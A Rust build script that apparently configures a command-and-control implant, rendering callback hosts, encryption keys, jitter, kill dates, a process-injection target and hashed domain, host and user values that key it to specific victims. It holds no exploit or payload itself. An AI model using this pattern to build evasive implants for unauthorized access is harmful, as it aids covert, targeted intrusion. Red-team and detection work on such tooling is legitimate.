use std::{collections::HashMap, path::Path};

use base64::{engine::general_purpose, Engine as _};
use minijinja::render;
use sha2::Digest;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    println!("cargo:rerun-if-changed=build.rs");
    println!("cargo:rerun-if-changed=config.rs.tmpl");

    let template = std::fs::read_to_string("config.rs.tmpl")?;

    let mut working_hours = env!("working_hours").split("-");
    let working_start = working_hours.next().unwrap().parse::<u64>()?;

    let working_end = working_hours.next().unwrap().parse::<u64>()?;

    let http_aes_key = option_env!("http_AESKEY")
        .map(|key| <[u8; 32]>::try_from(general_purpose::STANDARD.decode(key).unwrap()).unwrap());

    let http_headers = option_env!("http_headers").map(|headers| {
        let h: HashMap<String, String> = serde_json::from_str(headers).unwrap();
        h.iter()
            .map(|(k, v)| format!("(\"{}\", \"{}\")", k, v).to_string())
            .collect::<Vec<String>>()
    });

    let http_callback_hosts = option_env!("http_callback_hosts")
        .map(|callback_hosts| callback_hosts.split(",").collect::<Vec<&str>>())
        .unwrap_or_default();

    let domain = option_env!("domain")
        .map(|domain| {
            let domain = domain.to_lowercase();
            let mut hasher = sha2::Sha256::new();
            hasher.update(domain.as_bytes());
            hasher.finalize()
        })
        .unwrap_or_default();

    let hostname = option_env!("hostname")
        .map(|hostname| {
            let hostname = hostname.to_lowercase();
            let mut hasher = sha2::Sha256::new();
            hasher.update(hostname.as_bytes());
            hasher.finalize()
        })
        .unwrap_or_default();

    let username = option_env!("username")
        .map(|username| {
            let username = username.to_lowercase();
            let mut hasher = sha2::Sha256::new();
            hasher.update(username.as_bytes());
            hasher.finalize()
        })
        .unwrap_or_default();

    let tcp_aes_key = option_env!("tcp_AESKEY")
        .map(|key| <[u8; 32]>::try_from(general_purpose::STANDARD.decode(key).unwrap()).unwrap());

    let rendered = render!(&template,
        UUID => env!("UUID"),
        working_start => working_start,
        working_end => working_end,
        domain => <[u8; 32]>::try_from(domain).unwrap(),
        hostname => <[u8; 32]>::try_from(hostname).unwrap(),
        username => <[u8; 32]>::try_from(username).unwrap(),
        spawnto => option_env!("spawnto").unwrap_or_default(),
        connection_retries => env!("connection_retries").parse::<u32>().unwrap(),
        callback_interval => option_env!("http_callback_interval").map(|i| i.parse::<u64>().unwrap()).unwrap_or_default(),
        callback_jitter => option_env!("http_callback_jitter").map(|i| i.parse::<u32>().unwrap()).unwrap_or_default(),

        http_callback_port => option_env!("http_callback_port").map(|i| i.parse::<u32>().unwrap()).unwrap_or_default(),
        http_get_uri => option_env!("http_get_uri").unwrap_or_default(),
        http_headers => http_headers.unwrap_or_default(),
        http_killdate => option_env!("http_killdate").map(|k| k.parse::<u64>().unwrap()).unwrap_or_default(),
        http_post_uri => option_env!("http_post_uri").unwrap_or_default(),
        http_query_path_name => option_env!("http_query_path_name").unwrap_or_default(),
        http_callback_hosts => http_callback_hosts,
        http_AESKEY => http_aes_key.unwrap_or_default(),
        http_proxy_host => option_env!("http_proxy_host").unwrap_or_default(),
        http_proxy_port => option_env!("http_proxy_port").map(|i| i.parse::<u32>().unwrap()).unwrap_or_default(),

        tcp_killdate => option_env!("tcp_killdate").map(|k| k.parse::<u64>().unwrap()).unwrap_or_default(),
        tcp_AESKEY => tcp_aes_key.unwrap_or_default(),
        tcp_port => option_env!("tcp_port").map(|p| p.parse::<u16>().unwrap()).unwrap_or_default(),
    );

    let out_path = Path::new(&std::env::var_os("OUT_DIR").unwrap()).join("config.rs");
    std::fs::write(out_path, rendered)?;
    Ok(())
}
